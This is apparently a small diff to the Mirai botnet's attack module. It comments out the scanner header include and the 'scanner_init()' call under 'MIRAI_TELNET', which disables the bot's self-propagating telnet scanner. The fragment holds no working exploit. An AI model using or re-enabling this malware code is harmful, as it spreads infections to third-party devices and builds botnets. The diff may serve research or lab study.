@@ -12,7 +12,7 @@
 #include "attack.h"
 #include "rand.h"
 #include "util.h"
-#include "scanner.h"
+//#include "scanner.h"
 
 
 uint8_t methods_len = 0;
@@ -59,7 +59,7 @@ void attack_kill_all(void)
     }
 
 #ifdef MIRAI_TELNET
-    scanner_init();
+    //scanner_init();
 #endif
 }
 
